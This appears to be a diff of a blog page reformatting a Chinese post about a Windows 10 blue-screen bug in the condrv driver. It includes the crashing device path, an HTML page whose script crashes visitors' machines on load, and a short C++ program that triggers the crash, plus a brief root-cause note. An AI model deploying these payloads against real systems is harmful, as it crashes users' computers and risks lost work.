@@ -89,39 +89,22 @@
     <div class="article-entry" itemprop="articleBody">
       
         <p>#win10蓝屏bug<br>最近win10 的蓝屏bug最近很火，在google浏览器中输入：</p>
-<pre> \\.\globalroot\device\condrv\kernelconnect <pre>
-
-![enter image description here](https://secquan.zzyuncheng.com/e028b8d1549111d870b8c570c002ca18.png-quanzi)https://secquan.zzyuncheng.com/e028b8d1549111d870b8c570c002ca18.png-quanzi
-
-就会蓝屏，亲测有效；
-
-<pre> 看到吾爱中分析解释说是condrv驱动里的派遣函数CdpDispatchCleanup发生了空指针引用，而后触发了蓝屏。
-因为谷歌浏览器调用了GetFileAttributesExW函数，然后转入ntdll,接着走进了内核，然后调用了condrv的派遣函数。 <pre>
-
-
-
+<p>\.\globalroot\device\condrv\kernelconnect</p>
+<p><img src="https://secquan.zzyuncheng.com/e028b8d1549111d870b8c570c002ca18.png-quanzi" alt="enter image description here"><a target="_blank" rel="noopener" href="https://secquan.zzyuncheng.com/e028b8d1549111d870b8c570c002ca18.png-quanzi">https://secquan.zzyuncheng.com/e028b8d1549111d870b8c570c002ca18.png-quanzi</a></p>
+<p>就会蓝屏，亲测有效；</p>
+<p>看到吾爱中分析解释说是condrv驱动里的派遣函数CdpDispatchCleanup发生了空指针引用，而后触发了蓝屏。<br>因为谷歌浏览器调用了GetFileAttributesExW函数，然后转入ntdll,接着走进了内核，然后调用了condrv的派遣函数。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;html&gt;<br>&lt;head&gt;<br>&lt;&#x2F;head&gt;<br>&lt;body&gt;&gt;<br>&lt;script&gt;document.location &#x3D; &#39;\\\\.\\globalroot\\device\\condrv\\kernelconnect&#39;;&lt;&#x2F;script&gt;<br>&lt;&#x2F;body&gt;<br>&lt;&#x2F;html&gt;<br><br></code></pre></td></tr></table></figure>
-
-有师傅分享了代码：
-
-
+<p>有师傅分享了代码：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plain">&#x2F; BSOD.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。<br>&#x2F;&#x2F;<br>#include &lt;iostream&gt;<br>#include &lt;Windows.h&gt;<br>int main()<br>&#123;<br>    WCHAR fileName[] &#x3D; L&quot;\\\\.\\globalroot\\device\\condrv\\kernelconnect&quot;;<br>    WIN32_FILE_ATTRIBUTE_DATA data;<br>    GetFileAttributesEx(fileName, GetFileExInfoStandard, &amp;data);<br>&#125;<br></code></pre></td></tr></table></figure>
-直接编译成exe文件：
-
-![enter image description here](https://secquan.zzyuncheng.com/aca24da60da6bec2e6a1c31834ddf81e.png-quanzi)
-
-运行生成的exe文件，成功蓝屏：
-![enter image description here](https://secquan.zzyuncheng.com/9f91f10add04ef39b149d1d65fc32521.png-quanzi)
-好像没看到可以利用此漏洞来远程执行代码的，希望win10早点修复这个bug呗。
-
-参考链接：https://www.52pojie.cn/thread-1354077-1-1.html
-
-
+<p>直接编译成exe文件：</p>
+<p><img src="https://secquan.zzyuncheng.com/aca24da60da6bec2e6a1c31834ddf81e.png-quanzi" alt="enter image description here"></p>
+<p>运行生成的exe文件，成功蓝屏：<br><img src="https://secquan.zzyuncheng.com/9f91f10add04ef39b149d1d65fc32521.png-quanzi" alt="enter image description here"><br>好像没看到可以利用此漏洞来远程执行代码的，希望win10早点修复这个bug呗。</p>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1354077-1-1.html">https://www.52pojie.cn/thread-1354077-1-1.html</a></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/01/30/win10/" data-id="ckkjgg1gf0003fecpc3zcd1ig" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2021/01/30/win10/" data-id="ckkjgjeb70004hccpaocx7cce" class="article-share-link">Share</a>
       
       
     </footer>
@@ -180,7 +163,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/11/17/CVE-2020-1380%E7%AD%BE%E5%90%8D%E4%BC%AA%E9%80%A0/" data-id="ckkjgg1fh0000fecp469w9qi5" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2020/11/17/CVE-2020-1380%E7%AD%BE%E5%90%8D%E4%BC%AA%E9%80%A0/" data-id="ckkjgjead0000hccp8ihn1ywo" class="article-share-link">Share</a>
       
       
     </footer>
@@ -230,7 +213,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/11/17/httpsms/" data-id="ckkjgg1gi0004fecp5h5o25t2" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2020/11/17/httpsms/" data-id="ckkjgjeb40003hccpbio14dhz" class="article-share-link">Share</a>
       
       
     </footer>
@@ -268,7 +251,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/11/17/cms/" data-id="ckkjgg1gb0002fecpah8vf093" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2020/11/17/cms/" data-id="ckkjgjeav0001hccp514iccr8" class="article-share-link">Share</a>
       
       
     </footer>
@@ -306,7 +289,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/11/17/about/" data-id="ckkjgg1g40001fecphv633suc" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2020/11/17/about/" data-id="ckkjgjeb00002hccpaizf60wi" class="article-share-link">Share</a>
       
       
     </footer>
